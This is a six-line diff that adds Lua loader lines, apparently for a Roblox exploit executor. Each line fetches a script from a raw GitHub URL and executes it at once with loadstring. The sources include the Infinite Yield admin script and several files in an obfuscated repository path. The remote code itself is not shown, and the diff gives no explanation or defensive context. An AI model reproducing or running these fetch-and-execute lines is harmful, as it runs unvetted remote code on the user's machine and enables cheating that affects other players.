@@ -1,0 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OBaqt1nbJz1NipM92jv/6qQE2IF1FGovyLEEepBn/refs/heads/main/facefuck"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OBaqt1nbJz1NipM92jv/6qQE2IF1FGovyLEEepBn/refs/heads/main/Gclone"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gi7331/scripts/main/Emote.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OBaqt1nbJz1NipM92jv/6qQE2IF1FGovyLEEepBn/refs/heads/main/Baseplate"))()
